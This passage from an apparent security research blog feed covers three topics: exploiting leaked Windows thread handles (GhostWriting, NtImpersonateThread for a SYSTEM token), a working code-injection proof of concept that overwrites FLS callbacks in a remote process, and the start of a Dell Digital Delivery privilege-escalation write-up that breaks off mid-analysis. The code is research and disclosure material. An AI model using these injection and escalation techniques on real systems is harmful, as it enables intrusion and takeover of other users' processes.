We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
my write function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
</span><span class='line'>{
</span><span class='line'>    SetContextRegister(&context, g_rside, WriteWhat);
</span><span class='line'>    SetContextRegister(&context, g_lside, WriteWhere);
</span><span class='line'>
</span><span class='line'>    context.Rsp = StackBase;
</span><span class='line'>    context.Rip = MovAddr;
</span><span class='line'>
</span><span class='line'>    WaitForThreadAutoLock(hThread, &context, JmpAddr);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
appropriate registers. Once those are set, we set our stack base (adjusted from
threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
write our <code>JMP $</code> gadget to the stack.</p>

<p>They use what they call a thread auto lock to control execution flow (edits
mine):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
</span><span class='line'>{
</span><span class='line'>    SetThreadContext(Thread,PThreadContext);
</span><span class='line'>
</span><span class='line'>    do
</span><span class='line'>    {
</span><span class='line'>        ResumeThread(Thread);
</span><span class='line'>        Sleep(30); 
</span><span class='line'>        SuspendThread(Thread);
</span><span class='line'>        GetThreadContext(Thread,PThreadContext);
</span><span class='line'>    }
</span><span class='line'>    while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>

<p>Once our execution hits the jump, we have our write primitive. We can now
simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
any values we want.</p>

<p>I ported the core function of this technique to x64 to demonstrate its
viability. Instead of using it to execute an entire payload, I simply execute
<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
available on Github[11]. Turning it into something production ready is left as
an exercise for the reader ;)</p>

<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
it, it&rsquo;s probably more production ready and usable than mine.</p>

<h3>THREAD_DIRECT_IMPERSONATION</h3>

<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
impersonated, not simply TO impersonate. Exploiting this is simply a matter of
using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
Using this we&rsquo;re able to create a thread totally under our control and
impersonate the privileged one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &dwTid);
</span><span class='line'>NtImpersonateThread(hNewThread, hThread, &sqos);</span></code></pre></td></tr></table></div></figure>


<p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
whatever we need under the privileged impersonation context.</p>

<h3>THREAD_IMPERSONATE</h3>

<p>Unfortunately I was unable to identify a surefire, generic method for
exploiting this one. We have no ability to query the remote thread, nor can we
gain any control over its execution flow. We&rsquo;re simply allowed to manage its
impersonation state.</p>

<p>We can use this to force the privileged thread to impersonate us, using the
<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
application. For example, if the service were to create shared resources under
a user context for which it would typically be SYSTEM, such as a file, we can
gain ownership over that file. If multiple privileged threads access it for
information (such as configuration) it could lead to code execution.</p>

<h3>THREAD_SET_CONTEXT</h3>

<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
thread, it needs to enter an alertable state. This happens when a specific set
of win32 functions are executed, so it is entirely possible that the thread
never becomes alertable.</p>

<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
handy. Using it, we can force the thread to become alertable via the
<code>NtTestAlert</code> function. Of course, we have no ability to call
<code>GetThreadContext</code> and will therefore likely lose control of the thread after
exploitation.</p>

<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
replicate the Ghostwriting code injection technique discussed in the
<code>THREAD_ALL_ACCESS</code> section above.</p>

<h3>THREAD_SET_INFORMATION</h3>

<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
<code>NtSetInformationThread</code>. After looking through all of these, I did not
identify any immediate ways in which we could influence the remote thread. Some
of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
require <code>SeDebugPrivilege</code> or similar.</p>

<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
really not a lot of juicy stuff that can be done via the available functions</p>

<h3>THREAD_SET_LIMITED_INFORMATION</h3>

<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
anywhere near an exploitable primitive.</p>

<h3>THREAD_SET_THREAD_TOKEN</h3>

<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
method of abusing this right. I can set the thread&rsquo;s token or modify a few
fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>

<h2>Conclusion</h2>

<p>I was a little disappointed in how uneventful thread rights seemed to be.
Almost half of them proved to be unexploitable on their own, and even in
combination did not turn much up. As per above, having one of the following
three privileges is necessary to turn a leaked thread handle into something
exploitable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
</span><span class='line'>THREAD_DIRECT_IMPERSONATION
</span><span class='line'>THREAD_SET_CONTEXT</span></code></pre></td></tr></table></div></figure>


<p>Missing these will require a deeper understanding of your target and some
creativity.</p>

<p>Similarly, processes have a specific subset of rights that are directly
exploitable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
</span><span class='line'>PROCESS_CREATE_PROCESS
</span><span class='line'>PROCESS_CREATE_THREAD
</span><span class='line'>PROCESS_DUP_HANDLE
</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>


<p>Barring these, more creativity is required.</p>

<h2>References</h2>

<p>[0]<a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a> <br/>
[1]<a href="https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html">https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html</a> <br/>
[2]<a href="https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/">https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/</a> <br/>
[3]<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a> <br/>
[4]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a> <br/>
[5]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a> <br/>
[6]<a href="http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/">http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/</a> <br/>
[7]<a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html">https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html</a> <br/>
[8]<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html</a> <br/>
[9]<a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51">https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51</a> <br/>
[10]<a href="https://github.com/SafeBreach-Labs/pinjectra">https://github.com/SafeBreach-Labs/pinjectra</a> <br/>
[11]<a href="https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079">https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079</a> <br/>
[12]<a href="http://www.hexacorn.com/blog/category/code-injection/">http://www.hexacorn.com/blog/category/code-injection/</a> <br/>
[13]<a href="http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</a> <br/>
[14]<a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a> <br/>
[15]<a href="https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98">https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Code Execution via Fiber Local Storage]]></title>
    <link href="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/"/>
    <updated>2019-08-12T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</id>
    <content type="html"><![CDATA[<p>While working on another research project (post to be released soon, will
update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
technique that fit my situation perfectly. Instead of tainting the other post
with its description and code, I figured I&rsquo;d release a separate post describing
it here.</p>

<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
process, allocate some memory, and copy our shellcode into it. At this point we
simply need to gain control over execution flow; this is where most of
Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
great example is Windows Notification Facility via user subscription callbacks
(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>

<p>These strategies are also predicated on the process having certain capabilities
(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
not all, do not work across sessions or integrity levels. This is obvious and
expected and frankly quite niche, but in my situation, a requirement.</p>

<h2>Fibers</h2>

<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
application&rdquo;[1]. They are essentially register and stack states that can be
swapped in and out at will, and reflect upon the thread in which they are
executing. A single thread can be running at most a single fiber at a time, but
fibers can be hot swapped during execution and their quantum user controlled.</p>

<p>Fibers can also create and use fiber data. A pointer to this is stored in
<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void TestFiber()
</span><span class='line'>{
</span><span class='line'>    PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
</span><span class='line'>    PVOID lpFirstFiber = NULL;
</span><span class='line'>    memset(lpFiberData, 0x41, 0x10);
</span><span class='line'>
</span><span class='line'>    lpFirstFiber = ConvertThreadToFiber(lpFiberData);
</span><span class='line'>    DebugBreak();
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>int main()
</span><span class='line'>{
</span><span class='line'>    DWORD tid = 0;
</span><span class='line'>    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &tid);
</span><span class='line'>    WaitForSingleObject(hThread, INFINITE);
</span><span class='line'>    return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>We need to spawn off the test in a new thread, as the main thread will
always have a fiber instantiated and the call will fail. If we
run this in a debugger we can inspect the data after the break:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; ~
</span><span class='line'>.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen
</span><span class='line'>#  1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen
</span><span class='line'>0:000&gt; dt _NT_TIB 7ffdd000 FiberData
</span><span class='line'>ucrtbased!_NT_TIB
</span><span class='line'>   +0x010 FiberData : 0x002ea9c0 Void
</span><span class='line'>0:000&gt; dd poi(0x002ea9c0) l5
</span><span class='line'>002ea998  41414141 41414141 41414141 41414141
</span><span class='line'>002ea9a8  abababab</span></code></pre></td></tr></table></div></figure>


<p>In addition to fiber data, fibers also have access to the fiber local storage
(FLS). For all intents and purposes, this is identical to thread local storage
(TLS)[2]. This allows all thread fibers access to shared data via a global
index. The API for this is pretty simple, and very similar to TLS. In the
following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
previous example as base:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lpFirstFiber = ConvertThreadToFiber(lpFiberData);
</span><span class='line'>dwIdx = FlsAlloc(NULL);
</span><span class='line'>FlsSetValue(dwIdx, lpFiberData);
</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>


<p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
data is 6:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; ~
</span><span class='line'>   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
</span><span class='line'>.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
</span><span class='line'>0:001&gt; dt _TEB 7ffde000 FlsData
</span><span class='line'>ntdll!_TEB
</span><span class='line'>   +0xfb4 FlsData : 0x0049a008 Void
</span><span class='line'>0:001&gt; dd poi(0x0049a008+(4*8))
</span><span class='line'>0049a998  41414141 41414141 41414141 41414141
</span><span class='line'>0049a9a8  abababab</span></code></pre></td></tr></table></div></figure>


<p>Note that the offset is always the index + 2.</p>

<h2>Abusing FLS Callbacks to Obtain Execution Control</h2>

<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>An application-defined function. If the FLS slot is in use, FlsCallback is
</span><span class='line'>called on fiber deletion, thread exit, and when an FLS index is freed. Specify
</span><span class='line'>this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
</span><span class='line'>type defines a pointer to this callback function. </span></code></pre></td></tr></table></div></figure>


<p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);</span></code></pre></td></tr></table></div></figure>


<p>And fetching it (assuming again an index of 6):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; dt _PEB 7ffd8000 FlsCallback
</span><span class='line'>ucrtbased!_PEB
</span><span class='line'>   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
</span><span class='line'>0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
</span><span class='line'>002d5228  41414141</span></code></pre></td></tr></table></div></figure>


<p>What happens when we let this run to process exit?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; g
</span><span class='line'>(10a8.1328): Access violation - code c0000005 (first chance)
</span><span class='line'>First chance exceptions are reported before any exception handling.
</span><span class='line'>This exception may be expected and handled.
</span><span class='line'>eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
</span><span class='line'>eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>


<p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber
deletion, thread exit, and when an FLS index is freed</code>. This means that worst
case our code executes once the process exits and best case following a
threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
thread for each process will have a fiber instantiated already; it&rsquo;s quite
possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
callbacks are at the process level.</p>

<p>Another salient point here is the first parameter to the callback function.
This parameter is the value of whatever was in the indexed slot and is also
stashed in ECX/RCX before invoking the callback:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
</span><span class='line'>FlsSetValue(dwIdx, (PVOID)0x42424242);
</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>


<p>Which, when executed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(aa8.169c): Access violation - code c0000005 (first chance)
</span><span class='line'>First chance exceptions are reported before any exception handling.
</span><span class='line'>This exception may be expected and handled.
</span><span class='line'>eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
</span><span class='line'>eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>


<p>Under specific circumstances, this can be quite useful.</p>

<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#ifdef _WIN64
</span><span class='line'>#define FlsCallbackOffset 0x320
</span><span class='line'>#else
</span><span class='line'>#define FlsCallbackOffset 0x20c
</span><span class='line'>#endif
</span><span class='line'>
</span><span class='line'>void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess) 
</span><span class='line'>{
</span><span class='line'>    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
</span><span class='line'>                                                            "NtQueryInformationProcess");
</span><span class='line'>    const char *payload = "\xcc\xcc\xcc\xcc";
</span><span class='line'>    PROCESS_BASIC_INFORMATION pbi;
</span><span class='line'>    SIZE_T sCallback = 0, sRetLen = 0;
</span><span class='line'>    LPVOID lpBuf = NULL;
</span><span class='line'>
</span><span class='line'>    //
</span><span class='line'>    // allocate memory and write in our payload as one would normally do
</span><span class='line'>    //
</span><span class='line'>
</span><span class='line'>    lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span><span class='line'>    WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);
</span><span class='line'>
</span><span class='line'>    // now we need to fetch the remote process PEB
</span><span class='line'>    NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &pbi,
</span><span class='line'>                              sizeof(PROCESS_BASIC_INFORMATION), NULL);
</span><span class='line'>
</span><span class='line'>    // read the FlsCallback address out of it
</span><span class='line'>    ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
</span><span class='line'>                          (LPVOID)&sCallback, sizeof(SIZE_T), &sRetLen);
</span><span class='line'>    sCallback += 2 * sizeof(SIZE_T);
</span><span class='line'>
</span><span class='line'>    // we're targeting the _freefls call, so overwrite that with our payload
</span><span class='line'>    // address 
</span><span class='line'>    WriteProcessMemory(hProcess, (LPVOID)sCallback, &dwNewAddr, sizeof(SIZE_T), &sRetLen);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
process exit, the callback is executed and we gain control over execution flow.
Pretty useful in the end; more on this soon&hellip;</p>

<h2>References</h2>

<p>[0] <a href="http://www.hexacorn.com">http://www.hexacorn.com</a> <br/>
[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</a> <br/>
[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a> <br/>
[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation]]></title>
    <link href="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop/"/>
    <updated>2018-08-22T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop</id>
    <content type="html"><![CDATA[<p>Back in March or April I began reversing a slew of Dell applications installed
on a laptop I had. Many of them had privileged services or processes running
and seemed to perform a lot of different complex actions. I previously
disclosed a LPE in SupportAssist[0], and identified another in their Digital
Delivery platform. This post will detail a Digital Delivery vulnerability and
how it can be exploited. This was privately discovered and disclosed, and no
known active exploits are in the wild. Dell has issued a security advisory for
this issue, which can be found here[4].</p>

<p>I&rsquo;ll have another follow-up post detailing the internals of this application
and a few others to provide any future researchers with a starting point.
Both applications are rather complex and expose a large attack surface.
If you&rsquo;re interested in bug hunting LPEs in large C#/C++ applications, it&rsquo;s
a fine place to begin.</p>

<p>Dell&rsquo;s Digital Delivery[1] is a platform for buying and installing system
software. It allows users to purchase or manage software packages and reinstall
them as necessary. Once again, it comes &ldquo;..preinstalled on most Dell
systems.&rdquo;[1]</p>

<h2>Bug</h2>

<p>The Digital Delivery service runs as SYSTEM under the name DeliveryService,
which runs the DeliveryService.exe binary. A userland binary, DeliveryTray.exe,
is the user-facing component that allows users to view installed applications
or reinstall previously purchased ones.</p>

<p>Communication from DeliveryTray to DeliveryService is performed via a
Windows Communication Foundation (WCF) named pipe. If you&rsquo;re unfamiliar with
WCF, it&rsquo;s essentially a standard methodology for exchanging data between two
endpoints[2]. It allows a service to register a processing endpoint and expose
functionality, similar to a web server with a REST API.</p>

<p>For those following along at home, you can find the initialization of the WCF
pipe in <code>Dell.ClientFulfillmentService.Controller.Initialize</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>this._host = WcfServiceUtil.StandupServiceHost(typeof(UiWcfSession),
</span><span class='line'>                                typeof(IClientFulfillmentPipeService),
</span><span class='line'>                                "DDDService");</span></code></pre></td></tr></table></div></figure>


<p>This invokes <code>Dell.NamedPipe.StandupServiceHost</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ServiceHost host = null;
</span><span class='line'>string apiUrl = "net.pipe://localhost/DDDService/IClientFulfillmentPipeService";
</span><span class='line'>Uri realUri = new Uri("net.pipe://localhost/" + Guid.NewGuid().ToString());
</span><span class='line'>Tryblock.Run(delegate
</span><span class='line'>{
</span><span class='line'>  host = new ServiceHost(classType, new Uri[]
</span><span class='line'>  {
</span><span class='line'>    realUri
</span><span class='line'>  });
</span><span class='line'>  host.AddServiceEndpoint(interfaceType, WcfServiceUtil.CreateDefaultBinding(), string.Empty);
</span><span class='line'>  host.Open();
</span><span class='line'>}, null, null);
</span><span class='line'>AuthenticationManager.Singleton.RegisterEndpoint(apiUrl, realUri.AbsoluteUri);</span></code></pre></td></tr></table></div></figure>


<p>The endpoint is thus registered and listening and the AuthenticationManager
singleton is responsible for handling requests. Once a request comes in, the
AuthenticationManager passes this off to the AuthPipeWorker function which,
among other things, performs the following authentication:</p>

